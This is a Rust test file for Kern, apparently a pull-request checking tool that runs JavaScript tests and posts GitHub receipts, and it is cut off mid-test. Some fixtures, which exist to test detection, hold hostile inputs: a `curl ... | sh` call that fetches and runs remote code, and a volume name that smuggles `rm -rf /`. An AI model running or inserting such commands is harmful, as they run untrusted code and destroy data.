use kern::proof::{Count, Report};
use kern::util::*;
use kern::{check, drive, policy, receipt, suite};
use serde_json::{Value, json};
use std::collections::BTreeMap;
use std::path::{Path, PathBuf};
use std::process::Command;

struct Temp(PathBuf);
impl Temp {
    fn new() -> Temp {
        let p = std::env::temp_dir().join(format!("kern-reliability-{}", uuid4().unwrap()));
        std::fs::create_dir_all(&p).unwrap();
        Temp(p)
    }
}
impl Drop for Temp {
    fn drop(&mut self) { let _ = std::fs::remove_dir_all(&self.0); }
}

fn git(dir: &Path, args: &[&str]) -> String {
    let out = Command::new("git").args(args).current_dir(dir).env("GIT_AUTHOR_NAME", "t").env("GIT_AUTHOR_EMAIL", "t@t").env("GIT_COMMITTER_NAME", "t")
        .env("GIT_COMMITTER_EMAIL", "t@t").env("GIT_CONFIG_NOSYSTEM", "1").output().unwrap();
    assert!(out.status.success(), "git {args:?}: {}", String::from_utf8_lossy(&out.stderr));
    String::from_utf8_lossy(&out.stdout).trim().to_string()
}
fn write(dir: &Path, path: &str, text: &str) {
    let p = dir.join(path);
    std::fs::create_dir_all(p.parent().unwrap()).unwrap();
    std::fs::write(p, text).unwrap();
}
fn repo(t: &Temp, files: &[(&str, &str)]) -> (PathBuf, String) {
    let r = t.0.join("repo");
    std::fs::create_dir_all(&r).unwrap();
    git(&r, &["init", "-q", "-b", "main"]);
    git(&r, &["config", "core.autocrlf", "false"]);
    for (p, text) in files { write(&r, p, text); }
    git(&r, &["add", "-A"]);
    git(&r, &["commit", "-q", "--allow-empty", "-m", "base"]);
    let base = git(&r, &["rev-parse", "HEAD"]);
    (r, base)
}
fn commit(r: &Path, files: &[(&str, &str)]) -> String {
    for (p, text) in files { write(r, p, text); }
    git(r, &["add", "-A"]);
    git(r, &["commit", "-q", "-m", "change"]);
    git(r, &["rev-parse", "HEAD"])
}
fn operator() -> policy::Operator {
    policy::operator(&json!({ "version": 3, "repository": "acme/shop", "deployment": "single-vm", "executors": ["external"], "image": format!("sha256:{}", "a".repeat(64)),
        "builders": { "executor": null, "verifier": "e".repeat(64) }, "checks": [{ "id": "addition", "file": std::path::absolute("checks.json").unwrap(), "sha256": "b".repeat(64) }],
        "registry": "registry.npmjs.org", "permissions": {} })).unwrap()
}
fn report(tests: &[(&str, u32, u32, u32)], problems: &[&str]) -> Report {
    let mut t = BTreeMap::new();
    for (k, passed, failed, skipped) in tests { t.insert(k.to_string(), Count { passed: *passed, failed: *failed, skipped: *skipped }); }
    Report { tests: t, problems: problems.iter().map(|p| p.to_string()).collect(), why: BTreeMap::new() }
}
fn drive_json() -> Value { json!({ "base": "1111111111111111111111111111111111111111", "head": "2222222222222222222222222222222222222222", "skipped": [], "unmeasured": [] }) }
fn clean_rules() -> Value { json!({ "changed": [{ "path": "src/total.js", "operation": "modify" }], "powers": [], "tricks": [], "settings": [], "protected": [], "dependencies": [], "agent_notes": [], "not_checked": [] }) }
fn clean_tests() -> Value { json!({ "status": "RAN", "runner": "vitest", "before": { "passed": 12, "failed": 0, "skipped": 0 }, "after": { "passed": 12, "failed": 0, "skipped": 0 }, "kept": 12, "broke": [], "flaky": [], "gone": [], "newly_skipped": [], "added": [], "already_failing": [], "new_problems": [] }) }
fn off() -> Value { json!({ "status": "OFF", "why": "no AI key" }) }

const PACKAGE: &str = r#"{"name":"shop","devDependencies":{"vitest":"3.2.0"}}"#;
const MATH: &str = "export function sum(items) {\n  return items.reduce((a, b) => a + b, 0);\n}\nexport function product(items) {\n  return items.reduce((a, b) => a * b, 1);\n}\n";
const TOTAL: &str = "import { sum } from './math.js';\n\nexport function total(items) {\n  return sum(items);\n}\n";
const TOTAL_TEST: &str = "import { total } from '../src/total.js';\nimport { test, expect } from 'vitest';\ntest('adds', () => expect(total([2, 3])).toBe(5));\n";

#[test]
fn a_suite_in_which_no_test_passed_before_is_not_reported_as_run() {
    let before = report(&[("t > needs the database", 0, 1, 0), ("t > needs the network", 0, 1, 0)], &[]);
    let after = report(&[("t > needs the database", 0, 1, 0), ("t > needs the network", 0, 1, 0)], &[]);
    let c = suite::compare(&before, &after, None);
    assert_eq!(c["status"], "NOT_RUN", "no test passed before or after, so the tests showed nothing: {c}");
}

#[test]
fn a_change_to_an_import_line_still_runs_the_tests() {
    let t = Temp::new();
    let (r, base) = repo(&t, &[("package.json", PACKAGE), ("src/math.js", MATH), ("src/total.js", TOTAL), ("test/total.test.js", TOTAL_TEST)]);
    let head = commit(&r, &[("src/total.js", &TOTAL.replace("import { sum }", "import { product as sum }"))]);
    let out = check::check(&r, &base, &head, &t.0.join("out"), &operator(), None, None).unwrap();
    assert_ne!(out["tests"], "NOTHING_TO_RUN", "total() now multiplies, and the test that passed before would fail: {out}");
}

#[test]
fn a_submodule_change_is_named_in_the_receipt() {
    let t = Temp::new();
    let (r, _) = repo(&t, &[("package.json", PACKAGE), ("src/math.js", MATH)]);
    git(&r, &["update-index", "--add", "--cacheinfo", "160000,1111111111111111111111111111111111111111,vendor/payments"]);
    git(&r, &["commit", "-q", "-m", "add submodule"]);
    let base = git(&r, &["rev-parse", "HEAD"]);
    git(&r, &["update-index", "--cacheinfo", "160000,2222222222222222222222222222222222222222,vendor/payments"]);
    git(&r, &["commit", "-q", "-m", "move submodule"]);
    let head = git(&r, &["rev-parse", "HEAD"]);
    check::check(&r, &base, &head, &t.0.join("out"), &operator(), None, None).unwrap();
    let md = std::fs::read_to_string(t.0.join("out").join("receipt.md")).unwrap();
    assert!(md.contains("vendor/payments"), "the change points the project at other code, yet the receipt never names it:\n{md}");
}

#[test]
fn a_package_whose_tests_kern_runs_gets_its_dependencies_installed() {
    let t = Temp::new();
    let kit = r#"{"name":"kit","devDependencies":{"vitest":"3.2.0","left-pad":"1.3.0"}}"#;
    let (r, base) = repo(&t, &[("package.json", r#"{"name":"mono","private":true}"#), ("packages/kit/package.json", kit), ("packages/kit/src/pad.js", "export const pad = (s) => s;\n"),
        ("packages/kit/test/pad.test.js", "import { test, expect } from 'vitest';\nimport { pad } from '../src/pad.js';\ntest('pads', () => expect(pad('a')).toBe('a'));\n")]);
    let head = commit(&r, &[("packages/kit/test/pad.test.js", "import { test, expect } from 'vitest';\nimport { pad } from '../src/pad.js';\ntest('pads', () => expect(pad('b')).toBe('b'));\n")]);
    let has = |d: &str| d == "packages/kit";
    assert_eq!(suite::packages(&["packages/kit/test/pad.test.js"], has), ["packages/kit"], "Kern runs the tests of packages/kit");
    let out = t.0.join("out");
    drive::prepare(&r, &base, &head, &out, None).unwrap();
    assert!(drive::setup(&out, &operator(), u64::MAX).is_err(), "no Docker here, so setup stops after it writes its plan");
    let plan = read_json(out.join("sandbox").join("setup-new").join("drive-setup.json")).or_else(|_| read_json(out.join("sandbox").join("setup-old").join("drive-setup.json"))).unwrap();
    let dirs: Vec<String> = plan["dirs"].as_array().unwrap().iter().map(|d| d.as_str().unwrap().to_string()).collect();
    assert!(dirs.contains(&"packages/kit".to_string()), "Kern runs the tests of packages/kit but installs only {dirs:?}, so vitest and left-pad are missing there");
}

#[test]
fn a_receipt_whose_package_tests_did_not_run_does_not_say_nothing_unexpected() {
    let mut t = clean_tests();
    t["runner"] = json!("vitest in packages/kit");
    t["not_run"] = json!([{ "dir": "apps/web", "why": "Kern runs the tests of at most 5 packages per change" }]);
    let r = receipt::build(&drive_json(), &clean_rules(), &t, &off());
    let md = receipt::markdown(&r, None);
    assert!(!md.contains("### ✅ Kern: Nothing unexpected\n"), "the tests of apps/web never ran, yet the receipt opens with an unqualified pass:\n{md}");
}

#[test]
fn a_change_that_adds_large_text_fixtures_is_still_checked() {
    let t = Temp::new();
    let (r, base) = repo(&t, &[("package.json", PACKAGE), ("src/math.js", MATH)]);
    let line = format!("{}\n", "x".repeat(1023));
    let fixture = line.repeat(1000);
    let files: Vec<(String, String)> = (0..70).map(|i| (format!("test/fixtures/case{i:02}.txt"), format!("{i}\n{fixture}"))).collect();
    let refs: Vec<(&str, &str)> = files.iter().map(|(p, s)| (p.as_str(), s.as_str())).collect();
    let head = commit(&r, &refs);
    let out = drive::prepare(&r, &base, &head, &t.0.join("out"), None);
    assert!(out.is_ok(), "70 text fixtures of 1 MB each are an ordinary change: {:?}", out.err().map(|e| e.0));
}

type Seen = std::sync::Arc<std::sync::Mutex<Vec<(String, String, String)>>>;
fn stub_github(route: impl Fn(&str, &str) -> (u16, String) + Send + Sync + 'static) -> (String, Seen) {
    let listener = std::net::TcpListener::bind("127.0.0.1:0").unwrap();
    let url = format!("http://{}", listener.local_addr().unwrap());
    let seen: Seen = Default::default();
    let log = seen.clone();
    std::thread::spawn(move || {
        for stream in listener.incoming() {
            let Ok(mut s) = stream else { continue };
            let mut reader = std::io::BufReader::new(s.try_clone().unwrap());
            let mut request = String::new();
            if std::io::BufRead::read_line(&mut reader, &mut request).is_err() { continue; }
            let mut length = 0usize;
            loop {
                let mut line = String::new();
                if std::io::BufRead::read_line(&mut reader, &mut line).unwrap_or(0) == 0 || line == "\r\n" { break; }
                if let Some(v) = line.to_ascii_lowercase().strip_prefix("content-length:") { length = v.trim().parse().unwrap_or(0); }
            }
            let mut body = vec![0u8; length];
            let _ = std::io::Read::read_exact(&mut reader, &mut body);
            let parts: Vec<&str> = request.split_whitespace().collect();
            let (method, path) = (parts.first().copied().unwrap_or("").to_string(), parts.get(1).copied().unwrap_or("").to_string());
            log.lock().unwrap().push((method.clone(), path.clone(), String::from_utf8_lossy(&body).to_string()));
            let (status, reply) = route(&method, &path);
            let _ = std::io::Write::write_all(&mut s, format!("HTTP/1.1 {status} X\r\nContent-Type: application/json\r\nContent-Length: {}\r\nConnection: close\r\n\r\n{reply}", reply.len()).as_bytes());
        }
    });
    (url, seen)
}
fn posted_status(tests: Value) -> String {
    let t = Temp::new();
    receipt::write(&t.0, &receipt::build(&drive_json(), &clean_rules(), &tests, &off()), None).unwrap();
    let (url, seen) = stub_github(|m, p| match (m, p) {
        ("GET", p) if p.starts_with("/repos/acme/shop/pulls/7") => (200, r#"{"head":{"sha":"2222222222222222222222222222222222222222"}}"#.into()),
        ("GET", p) if p.starts_with("/repos/acme/shop/issues/7/comments") => (200, "[]".into()),
        ("POST", _) => (201, r#"{"id":5,"html_url":"https://github.com/acme/shop/pull/7#c5"}"#.into()),
        _ => (404, "{}".into()),
    });
    receipt::post(&kern::github::Api::new(&url, "t").unwrap(), &t.0, "acme/shop", 7).unwrap();
    let log = seen.lock().unwrap().clone();
    let body = &log.iter().find(|(m, p, _)| m == "POST" && p.contains("/statuses/")).unwrap().2;
    serde_json::from_str::<Value>(body).unwrap()["description"].as_str().unwrap().to_string()
}

#[test]
fn a_status_for_a_receipt_whose_tests_did_not_run_differs_from_one_whose_tests_passed() {
    let ran = posted_status(clean_tests());
    let not_run = posted_status(json!({ "status": "NOT_RUN", "why": "Kern could not run the tests: Sandbox unavailable" }));
    assert_ne!(not_run, ran, "the Kern status is all a merge rule and the checks list show, and it reads the same whether the tests passed or never ran");
}

#[test]
fn a_receipt_after_a_thousand_comments_is_still_found() {
    let (url, _) = stub_github(|m, p| {
        if m != "GET" || !p.starts_with("/repos/acme/shop/issues/7/comments") { return (404, "{}".into()); }
        let page: u64 = p.split("page=").last().and_then(|n| n.parse().ok()).unwrap_or(1);
        if page <= 10 {
            let others: Vec<Value> = (0..100).map(|i| json!({ "id": page * 1000 + i, "user": { "login": "renovate[bot]" }, "body": "Bump a dependency" })).collect();
            return (200, json!(others).to_string());
        }
        if page == 11 { return (200, json!([{ "id": 99, "user": { "login": "github-actions[bot]" }, "body": "<!-- kern-receipt -->\n### ⚠️ Kern: 1 thing needs a look\n", "html_url": "https://github.com/acme/shop/pull/7#c99" }]).to_string()); }
        (200, "[]".into())
    });
    let v = receipt::verify(&kern::github::Api::new(&url, "t").unwrap(), "acme/shop", 7, &json!({ "keys": [] }), None).unwrap();
    assert_eq!(v["status"], "UNSIGNED", "Kern's receipt is the 1,001st comment; Kern says there is none: {v}");
}

#[test]
fn a_package_left_out_of_the_workspaces_gets_its_own_install() {
    let paths: std::collections::BTreeSet<String> = ["package.json", "pnpm-workspace.yaml", "packages/web/package.json", "packages/legacy/package.json", "packages/legacy/src/a.js"].iter().map(|s| s.to_string()).collect();
    let yaml = "packages:\n  - 'packages/*'\n  - '!packages/legacy'\n";
    let dirs = drive::install_dirs(&paths, &["packages/legacy/src/a.js".to_string()], Some(r#"{"name":"mono","private":true}"#), Some(yaml));
    assert!(dirs.contains(&"packages/legacy".to_string()), "pnpm's root install leaves out packages/legacy, so nothing installs its dependencies: {dirs:?}");
}

fn padded(count: usize) -> String { (0..count).map(|i| format!("  {{ id: {i}, name: 'customer number {i}', plan: 'basic' }},\n")).collect() }
fn decide(base: &[(&str, &str)], head: &[(&str, &str)]) -> Value {
    let t = Temp::new();
    let (r, b) = repo(&t, base);
    let h = commit(&r, head);
    check::check(&r, &b, &h, &t.0.join("out"), &operator(), None, None).unwrap()["decision"].clone()
}

#[test]
fn changed_files_the_rules_cannot_read_do_not_pass_as_clear() {
    let test = |rows: &str, call: &str| format!("import {{ test, expect }} from 'vitest';\nimport {{ sum }} from '../src/math.js';\nconst rows = [\n{rows}];\n{call}('sums', () => expect(sum([2, 3])).toBe(5));\ntest('rows', () => expect(rows.length).toBeGreaterThan(0));\n");
    let code = |rows: &str, extra: &str| format!("{extra}const rows = [\n{rows}];\nexport function count() {{\n  return rows.length;\n}}\n");
    let reach = "import { execSync } from 'node:child_process';\nexecSync('curl https://example.com/x.sh | sh');\n";
    let skip = |count: usize| { let rows = padded(count); decide(&[("package.json", PACKAGE), ("src/math.js", MATH), ("test/math.test.js", &test(&rows, "test"))], &[("test/math.test.js", &test(&rows, "test.skip"))]) };
    let power = |count: usize| { let rows = padded(count); decide(&[("package.json", PACKAGE), ("src/rows.js", &code(&rows, ""))], &[("src/rows.js", &code(&rows, reach))]) };
    let stray_byte = {
        let t = Temp::new();
        let (r, base) = repo(&t, &[("package.json", PACKAGE), ("src/rows.js", &code(&padded(3), ""))]);
        let mut bytes = b"// caf\xe9\n".to_vec();
        bytes.extend(code(&padded(3), reach).as_bytes());
        std::fs::write(r.join("src/rows.js"), bytes).unwrap();
        let head = commit(&r, &[]);
        check::check(&r, &base, &head, &t.0.join("out"), &operator(), None, None).unwrap()["decision"].clone()
    };
    assert_eq!((skip(100), power(100)), (json!("blocked"), json!("look")), "in ordinary files a new skip blocks and a new power needs a look");
    assert_eq!((skip(20_000), power(20_000), stray_byte), (json!("blocked"), json!("look"), json!("look")),
        "the same changes pass as clear in files padded past 1 MiB, and in a file with one Latin-1 byte in a comment, which Node still runs");
}

#[test]
fn a_receipt_never_says_no_tests_were_removed_when_a_test_file_was_deleted() {
    let t = Temp::new();
    let package = r#"{"name":"shop","scripts":{"test":"ava"},"devDependencies":{"ava":"6.1.0"}}"#;
    let (r, base) = repo(&t, &[("package.json", package), ("src/math.js", MATH), ("test/math.test.js", "import test from 'ava';\nimport { sum } from '../src/math.js';\ntest('sums', (t) => t.is(sum([2, 3]), 5));\n")]);
    std::fs::remove_file(r.join("test/math.test.js")).unwrap();
    let head = commit(&r, &[]);
    let out = check::check(&r, &base, &head, &t.0.join("out"), &operator(), None, None).unwrap();
    let md = std::fs::read_to_string(t.0.join("out").join("receipt.md")).unwrap();
    assert!(!md.contains("No skipped, focused or removed tests"), "the change deletes test/math.test.js and the tests did not run ({}), yet the receipt says:\n{md}", out["tests"]);
}

#[test]
fn github_hiccups_are_retried_and_a_receipt_comment_is_never_doubled() {
    use std::sync::atomic::{AtomicUsize, Ordering::SeqCst};
    let t = Temp::new();
    receipt::write(&t.0, &receipt::build(&drive_json(), &clean_rules(), &clean_tests(), &off()), None).unwrap();
    let (pulls, created, statuses) = (std::sync::Arc::new(AtomicUsize::new(0)), std::sync::Arc::new(AtomicUsize::new(0)), std::sync::Arc::new(AtomicUsize::new(0)));
    let (p, c, s) = (pulls.clone(), created.clone(), statuses.clone());
    let (url, seen) = stub_github(move |m, path| match (m, path) {
        ("GET", x) if x.starts_with("/repos/acme/shop/pulls/7") => {
            if p.fetch_add(1, SeqCst) < 2 { (502, "{}".into()) } else { (200, r#"{"head":{"sha":"2222222222222222222222222222222222222222"}}"#.into()) }
        }
        ("GET", x) if x.starts_with("/repos/acme/shop/issues/7/comments") => {
            if c.load(SeqCst) == 0 { return (200, "[]".into()); }
            (200, json!([{ "id": 5, "user": { "login": "github-actions[bot]" }, "body": "<!-- kern-receipt -->\nhalf", "html_url": "https://github.com/acme/shop/pull/7#c5" }]).to_string())
        }
        ("POST", "/repos/acme/shop/issues/7/comments") => { c.fetch_add(1, SeqCst); (502, "{}".into()) }
        ("PATCH", "/repos/acme/shop/issues/comments/5") => (200, "{}".into()),
        ("POST", x) if x.starts_with("/repos/acme/shop/statuses/") => if s.fetch_add(1, SeqCst) == 0 { (429, "{}".into()) } else { (201, "{}".into()) },
        _ => (404, "{}".into()),
    });
    let out = receipt::post(&kern::github::Api::new(&url, "t").unwrap(), &t.0, "acme/shop", 7);
    let log = seen.lock().unwrap().clone();
    let out = out.unwrap_or_else(|e| panic!("two 502s and a rate limit are ordinary GitHub hiccups: {} after {log:?}", e.0));
    assert_eq!(created.load(SeqCst), 1, "GitHub made the comment and then answered 502; asking again would post the receipt twice: {log:?}");
    assert!(log.iter().any(|(m, p, b)| m == "PATCH" && p.ends_with("/comments/5") && b.contains("kern-receipt")), "the comment GitHub made is filled in instead: {log:?}");
    assert_eq!(statuses.load(SeqCst), 2, "a rate-limited status is sent again: {log:?}");
    assert_eq!(out["state"], "success", "{out}");
}

#[test]
fn a_check_has_one_time_limit_and_each_run_gets_only_the_time_left() {
    let now = now_ms();
    assert_eq!(within(u64::MAX, 900), 900, "with no limit a run keeps its own");
    let left = within(now + 120_000, 900);
    assert!((118..=120).contains(&left), "two minutes left gives a run two minutes, not fifteen: {left}");
    assert_eq!(within(now.saturating_sub(1), 900), 0, "a limit already passed leaves nothing");
    assert_eq!(check::minutes(), 55, "the check ends well before the workflow's 75-minute job limit");
}

#[test]
fn a_check_killed_while_it_set_up_leaves_a_record_that_clean_reads() {
    let t = Temp::new();
    std::fs::write(t.0.join("volumes.txt"), "not-a-kern-volume\nkern-deps-x;rm -rf /\n").unwrap();
    let r = drive::clean(&t.0).unwrap();
    assert_eq!(r["removed"], json!([]), "only Kern's own volume names reach docker: {r}");
    assert!(!t.0.join("volumes.txt").exists(), "the record is gone once the volumes are");
}

#[test]
fn a_change_to_how_the_tests_run_needs_a_look_and_a_dependency_bump_does_not() {
    let settings = |base: &str, head: &str| -> Vec<Value> {
        let t = Temp::new();
        let (r, b) = repo(&t, &[("package.json", base), ("src/math.js", MATH)]);
        let h = commit(&r, &[("package.json", head)]);
        kern::rules::rules(&r, &b, &h).unwrap()["settings"].as_array().cloned().unwrap_or_default()
    };
    let script = |test: &str, vitest: &str| format!(r#"{{"name":"shop","scripts":{{"test":"{test}"}},"devDependencies":{{"vitest":"{vitest}"}}}}"#);
    assert!(settings(&script("vitest run", "3.2.0"), &script("vitest run", "3.2.4")).is_empty(), "a version bump leaves how the tests run alone");
    assert!(settings(&script("vitest run", "3.2.0"), &script("vitest", "3.2.0")).is_empty(), "vitest and vitest run run the same tests");
    let changed = settings(&script("vitest run", "3.2.0"), &script("vitest run --config fake.config.js", "3.2.0"));
    assert_eq!(changed.len(), 1, "a pull request that points the tests at another config changes which tests run: {changed:?}");
    assert_eq!(changed[0]["path"], "package.json");
    let jest = |block: &str| format!(r#"{{"name":"shop","scripts":{{"test":"jest"}},"devDependencies":{{"jest":"30.0.0"}},"jest":{block}}}"#);
    assert_eq!(settings(&jest(r#"{"testEnvironment":"node"}"#), &jest(r#"{"testEnvironment":"node","setupFiles":["./quiet.js"]}"#)).len(), 1,
        "jest settings kept in package.json decide which tests run as much as jest.config.js does");
}

#[test]
fn a_text_file_the_code_reads_is_not_documentation() {
    let allow = "import { readFileSync } from 'node:fs';\nexport const allowed = () => readFileSync(new URL('./allowlist.txt', import.meta.url), 'utf8').split('\\n');\n";
    let tests_after = |files: &[(&str, &str)], change: &[(&str, &str)]| -> Value {
        let t = Temp::new();
        let (r, b) = repo(&t, files);
        let h = commit(&r, change);
        check::check(&r, &b, &h, &t.0.join("out"), &operator(), None, None).unwrap()["tests"].clone()
    };
    let files = [("package.json", PACKAGE), ("src/allow.js", allow), ("src/allowlist.txt", "example.com\n"), ("README.md", "# shop\n")];
    assert_ne!(tests_after(&files, &[("src/allowlist.txt", "example.com\nevil.example\n")]), json!("NOTHING_TO_RUN"),
        "the code reads allowlist.txt, so a change to it changes what the code does and the tests must run");
    assert_eq!(tests_after(&files, &[("README.md", "# shop\n\nAdds up baskets.\n")]), json!("NOTHING_TO_RUN"), "no code reads the README");
}

#[test]
fn a_blocked_test_file_says_why_it_no_longer_runs() {
    let report = |message: &str| -> Vec<u8> {
        let status = if message.is_empty() { "passed" } else { "failed" };
        let assertions = if message.is_empty() { json!([{ "ancestorTitles": [], "title": "carts", "status": "passed" }]) } else { json!([]) };
        json!({ "numTotalTests": 1, "testResults": [
            { "name": "/workspace/test/total.test.js", "status": "passed", "message": "", "assertionResults": [{ "ancestorTitles": [], "title": "adds", "status": "passed" }] },
            { "name": "/workspace/test/cart.test.js", "status": status, "message": message, "assertionResults": assertions }
        ] }).to_string().into_bytes()
    };
    let before = kern::proof::read_report(policy::Runner::Vitest, &report("")).unwrap();
    let after = kern::proof::read_report(policy::Runner::Vitest, &report("\u{1b}[31mError: Cannot find module '../src/cart.js'\u{1b}[39m\n  imported from test/cart.test.js\n    at resolve (node:internal)")).unwrap();
    let tests = suite::compare(&before, &after, Some(&after));
    let md = receipt::markdown(&receipt::build(&drive_json(), &clean_rules(), &tests, &off()), None);
    assert!(md.contains("test/cart.test.js") && md.contains("Cannot find module") && !md.contains("\u{1b}"), "a block names the error, without terminal colours:\n{md}");
}

#[test]
fn a_test_counts_as_gone_only_when_it_passed_before_and_stays_gone() {
    let before = report(&[("a > passes", 1, 0, 0), ("a > needs a database", 0, 1, 0), ("b > flaky file", 1, 0, 0)], &[]);
    let after = report(&[], &[]);
    let again = report(&[("b > flaky file", 1, 0, 0)], &[]);
    let c = suite::compare(&before, &after, Some(&again));
    assert_eq!(c["gone"], json!(["a > passes"]), "a test that already failed before is set aside, and one that came back on the rerun did not go: {c}");
    let c = suite::compare(&before, &after, None);
    assert_eq!(c["gone"], json!(["a > passes", "b > flaky file"]), "{c}");
}

#[test]
fn the_sandbox_says_why_it_could_not_run_the_tests() {
    let errors = b"npm warn something\n{\"reason\":\"The test runner is not installed in the project: /workspace/node_modules/.bin/jest does not exist\",\"status\":\"DENIED\"}\n";
    assert_eq!(kern::sandbox::refusal(errors).as_deref(), Some("The test runner is not installed in the project: /workspace/node_modules/.bin/jest does not exist"));
    assert_eq!(kern::sandbox::refusal(b"no json here\n"), None);
}

#[test]
fn a_package_json_change_says_what_changed_in_it() {
    let look = |base: &str, head: &str| -> Vec<String> {
        let t = Temp::new();
        let (r, b) = repo(&t, &[("package.json", base), ("src/math.js", MATH)]);
        let h = commit(&r, &[("package.json", head)]);
        let rules = kern::rules::rules(&r, &b, &h).unwrap();
        receipt::build(&drive_json(), &rules, &clean_tests(), &off())["look"].as_array().unwrap().iter().filter(|x| x["kind"] == "dependencies").map(|x| x["what"].as_str().unwrap().to_string()).collect()
    };
    let base = r#"{"name":"shop","main":"src/math.js","scripts":{"test":"vitest run","build":"tsc"},"devDependencies":{"vitest":"3.2.0"}}"#;
    let hook = r#"{"name":"shop","main":"src/math.js","scripts":{"test":"vitest run","build":"tsc","postinstall":"node setup.js"},"devDependencies":{"vitest":"3.2.0"}}"#;
    let items = look(base, hook);
    assert!(items.len() == 1 && items[0].contains("scripts.postinstall") && !items[0].contains("dependencies change"), "a new install hook is named as what it is: {items:?}");
    let bump = r#"{"name":"shop","main":"src/index.js","scripts":{"test":"vitest run","build":"tsc"},"devDependencies":{"vitest":"3.2.4"}}"#;
    let items = look(base, bump);
    assert!(items.len() == 1 && items[0].contains("vitest 3.2.0") && items[0].contains("main"), "{items:?}");
}

#[test]
fn a_failure_the_old_code_also_shows_when_its_file_runs_alone_never_blocks() {
    let before = report(&[("packages/cli/build.test.ts > builds", 1, 0, 0), ("packages/core/merge.test.ts > merges", 1, 0, 0)], &[]);
    let after = report(&[("packages/core/merge.test.ts > merges", 0, 1, 0)], &["packages/cli/build.test.ts"]);
    let alone_new = report(&[("packages/core/merge.test.ts > merges", 0, 1, 0)], &["packages/cli/build.test.ts"]);
    let alone_old = report(&[("packages/core/merge.test.ts > merges", 1, 0, 0)], &["packages/cli/build.test.ts"]);
    let c = suite::judged(&before, &after, Some(&alone_new), Some(&alone_old));
    assert_eq!(c["new_problems"], json!([]), "the file fails alone on the old code too (it needs a sibling package built), so the full run passing it was luck: {c}");
    assert_eq!(c["broke"], json!(["packages/core/merge.test.ts > merges"]), "this test fails alone on the new code and passes alone on the old code: {c}");
    assert!(c["environmental"].as_array().unwrap().iter().any(|f| f == "packages/cli/build.test.ts"), "the file fails on the old code alone too, so it is set aside: {c}");
    let shaky_old = report(&[("packages/core/merge.test.ts > merges", 0, 1, 0)], &[]);
    let c = suite::judged(&before, &after, Some(&alone_new), Some(&shaky_old));
    assert_eq!(c["broke"], json!([]), "a test that fails alone on the old code is not broken by the change: {c}");
}

#[test]
fn suspect_test_files_are_run_again_alone_with_the_project_s_own_options() {
    let files: std::collections::BTreeSet<String> = ["packages/cli/src/a.test.ts".to_string(), "packages/cli/src/[id].test.ts".to_string()].into();
    let tests = |runner: policy::Runner, command: &[&str]| policy::Tests { paths: Vec::new(), kind: policy::Kind::Feature, runner, command: command.iter().map(|s| s.to_string()).collect(), edits: policy::Edits::Checked };
    let jest = suite::focused(&tests(policy::Runner::Jest, &["/workspace/node_modules/.bin/jest", "--config", "jest.unit.js"]), &files, "packages/cli").unwrap();
    assert_eq!(jest.command, ["/workspace/node_modules/.bin/jest", "--config", "jest.unit.js", "--runTestsByPath", "/workspace/packages/cli/src/[id].test.ts", "/workspace/packages/cli/src/a.test.ts"]);
    let vitest = suite::focused(&tests(policy::Runner::Vitest, &["/workspace/node_modules/.bin/vitest", "run", "--maxWorkers=2"]), &files, "packages/cli").unwrap();
    assert_eq!(vitest.command, ["/workspace/node_modules/.bin/vitest", "run", "--maxWorkers=2", "src/[id].test.ts", "src/a.test.ts"]);
    assert!(suite::focused(&tests(policy::Runner::Vitest, &["/workspace/node_modules/.bin/vitest", "run", "tests/unit"]), &files, "packages/cli").is_none(), "a script that already filters files cannot be narrowed by adding more filters");
    assert!(suite::focused(&tests(policy::Runner::Mocha, &["/workspace/node_modules/.bin/mocha"]), &files, "").is_none());
}

#[test]
fn a_failure_that_shows_only_when_files_run_together_needs_a_look() {
    let before = report(&[("a.test.ts > shares state", 1, 0, 0), ("b.test.ts > flakes", 1, 0, 0)], &[]);
    let after = report(&[("a.test.ts > shares state", 0, 1, 0), ("b.test.ts > flakes", 0, 1, 0)], &[]);
    let alone_new = report(&[("a.test.ts > shares state", 1, 0, 0), ("b.test.ts > flakes", 1, 0, 0)], &[]);
    let whole_again = report(&[("a.test.ts > shares state", 0, 1, 0), ("b.test.ts > flakes", 1, 0, 0)], &[]);
    let alone_old = report(&[("a.test.ts > shares state", 1, 0, 0), ("b.test.ts > flakes", 1, 0, 0)], &[]);
    let c = suite::confirmed(&before, &after, Some(&alone_new), Some(&whole_again), Some(&alone_old));
    assert_eq!(c["together"], json!(["a.test.ts > shares state"]), "it passes alone but fails again in the whole suite: a look, never a silent pass, and no block it cannot reproduce: {c}");
    assert_eq!(c["flaky"], json!(["b.test.ts > flakes"]), "{c}");
}

#[test]
fn tests_that_cannot_load_on_either_side_are_named_as_such_with_the_first_error() {
    let mut before = report(&[], &["components/table.test.tsx", "components/form.test.tsx"]);
    before.why.insert("components/form.test.tsx".into(), "Cannot find module './version' from 'components/version/index.tsx'".into());
    let c = suite::compare(&before, &before.clone(), None);
    assert_eq!(c["status"], "NOT_RUN");
    let why = c["why"].as_str().unwrap();
    assert!(why.contains("2 test files") && why.contains("components/form.test.tsx") && why.contains("Cannot find module"), "the tests did not go missing: none of them could load, and the receipt says why: {why}");
}

#[test]
fn a_test_counts_as_newly_skipped_only_when_the_rerun_skips_it_too_and_the_old_code_alone_does_not() {
    let before = report(&[("t/a.test.ts > hook guarded", 1, 0, 0), ("t/b.test.ts > really skipped", 1, 0, 0), ("t/c.test.ts > skips alone on old", 1, 0, 0)], &[]);
    let after = report(&[("t/a.test.ts > hook guarded", 0, 0, 1), ("t/b.test.ts > really skipped", 0, 0, 1), ("t/c.test.ts > skips alone on old", 0, 0, 1)], &[]);
    let again = report(&[("t/a.test.ts > hook guarded", 1, 0, 0), ("t/b.test.ts > really skipped", 0, 0, 1), ("t/c.test.ts > skips alone on old", 0, 0, 1)], &[]);
    let alone_old = report(&[("t/a.test.ts > hook guarded", 1, 0, 0), ("t/b.test.ts > really skipped", 1, 0, 0), ("t/c.test.ts > skips alone on old", 0, 0, 1)], &[]);
    let c = suite::judged(&before, &after, Some(&again), Some(&alone_old));
    assert_eq!(c["newly_skipped"], json!(["t/b.test.ts > really skipped"]), "a hook that fails at random makes vitest skip a suite's tests: {c}");
}

#[test]
fn a_receipt_never_says_tests_still_pass_when_no_test_could_load_on_the_old_code() {
    let mut before = report(&[], &["app/a.test.ts", "app/b.test.ts"]);
    before.why.insert("app/a.test.ts".into(), "Cannot use import statement outside a module".into());
    let mut after = before.clone();
    after.problems.push("app/new.test.ts".into());
    let c = suite::compare(&before, &after, Some(&after));
    assert_eq!(c["status"], "NOT_RUN", "nothing loaded on the old code, so there was nothing to compare: {c}");
    assert!(c["why"].as_str().unwrap().contains("could load"), "{c}");
